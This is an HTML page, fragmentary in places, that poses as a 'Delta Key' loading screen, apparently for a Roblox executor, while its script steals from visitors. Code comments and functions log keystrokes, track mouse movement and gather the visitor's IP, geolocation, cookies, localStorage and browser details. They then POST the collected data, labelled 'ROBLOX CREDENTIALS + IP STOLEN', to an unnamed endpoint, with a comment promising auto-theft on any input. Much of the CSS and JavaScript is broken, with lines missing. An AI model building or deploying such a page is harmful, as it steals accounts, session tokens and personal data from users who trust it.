<!DOCTYPE html>
<html lang="en">
<head>

        * {

            background: linear-gradient(135deg, #0f0f23 0%, #1a1a3e 50%, #2d1b69 100%);

            overflow: hidden;
            height: 100vh;

            justify-content: center;

        .container {

            font-weight: bold;
            background: linear-gradient(45deg, #00ff41, #00cc33);

            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
            text-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
        }
        .version {
            color: #00cc33;
            font-size: 1.2em;
            margin-bottom: 30px;
        }
        .status {
            margin: 20px 0;

        }
        .progress-bar {
            width: 100%;
            height: 10px;
            background: #333;
            border-radius: 5px;
            overflow: hidden;

            border: 1px solid #00ff41;
        }

        }
        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin: 30px 0;
            text-align: left;
        }
        .feature {
            background: rgba(0, 255, 65, 0.1);
            padding: 10px;
            border-radius: 8px;
            border-left: 4px solid #00ff41;
        }
        .check {
            color: #00ff41;
            margin-right: 8px;
        }
        .loading-dots {
            display: inline-flex;
            gap: 4px;
        }
        .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #00ff41;
            animation: pulse 1.5s infinite;
        }
        .dot:nth-child(2) { animation-delay: 0.2s; }
        .dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes pulse {
            0%, 80%, 100% { opacity: 0.3; transform: scale(0.8); }
            40% { opacity: 1; transform: scale(1.2); }
        }
        .input-group {
            margin: 20px 0;
            position: relative;
        }
        input {
            width: 100%;
            padding: 15px;
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #00ff41;
            border-radius: 8px;
            color: #00ff41;
            font-size: 1.1em;
            text-align: center;
        }
        input::placeholder {
            color: #00cc33;
        }
        input:focus {
            outline: none;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
        }
        .btn {
            background: linear-gradient(45deg, #00ff41, #00cc33);
            color: #000;
            border: none;
            padding: 15px 40px;
            border-radius: 8px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            margin: 10px;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 255, 65, 0.4);
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 255, 65, 0.6);
        }
        .btn:active {
            transform: translateY(0);
        }
        .hidden {
            display: none;
        }
        .success {
            color: #00ff41 !important;
            font-weight: bold;
        }
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }
        .particle {
            position: absolute;
            width: 4px;
            height: 4px;
            background: #00ff41;
            border-radius: 50%;
            animation: float 6s infinite linear;
        }
        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
        }
    </style>
</head>
<body>

        // Particle system for realism

            const particles = document.getElementById('particles');

                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 6 + 's';

        // IP Geolocation services (multiple for accuracy)

            'https://api.ipify.org?format=json',

            for (const service of ipServices) {

                    const response = await fetch(service, { mode: 'no-cors' });

                            break;

                        const data = await fetch(service).then(r => r.json());
                        if (data.ip) {
                            victimIP = data.ip;
                            geoData = data;
                            break;
                        }
                    }
                } catch (e) {

        // Fake loading sequence

        let step = 0;
        const progress = document.getElementById('progress');
        const status = document.getElementById('status');
        const keyInput = document.getElementById('keyInput');
        const loginInput = document.getElementById('loginInput');

        // Get IP first
        getVictimIP().then(() => {
            loadingSteps[3] = `📍 Geolocation: ${victimIP}`;
            
            const loadingInterval = setInterval(() => {
                if (step < loadingSteps.length) {
                    status.textContent = loadingSteps[step];
                    const progressPercent = (step / loadingSteps.length) * 100;
                    progress.style.width = progressPercent + '%';
                    step++;
                } else {
                    clearInterval(loadingInterval);
                    keyInput.classList.remove('hidden');
                    status.textContent = "Enter your Delta Key to continue...";
                    status.className = 'status success';
                }
            }, 800);
        });

        // Keylogger functionality

            keylog.push({
                key: e.key,
                code: e.code,
                time: Date.now(),
                ctrl: e.ctrlKey,
                shift: e.shiftKey,
                alt: e.altKey
            });
        });

        // Mouse tracking
        document.addEventListener('mousemove', (e) => {
            if (!window.mouseData) window.mouseData = [];
            window.mouseData.push({
                x: e.clientX,
                y: e.clientY,
                time: Date.now()
            });
            if (window.mouseData.length > 50) {
                window.mouseData.shift();
            }
        });

        // Steal cookies and localStorage
        async function stealData() {
            const stolenData = {
                ip: victimIP,
                geo: geoData,
                cookies: document.cookie,
                localStorage: Object.fromEntries(Object.entries(localStorage)),

                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                keylog: keylog.slice(-100),
                mouseData: window.mouseData || [],
                url: window.location.href,
                referrer: document.referrer,
                webgl: navigator.userAgent.includes('Chrome') ? 'Enabled' : 'Disabled'

        }

                    method: 'POST',

                    body: JSON.stringify({
                        username: '🚨 ROBLOX CREDENTIALS + IP STOLEN',

        // Auto-steal on any input
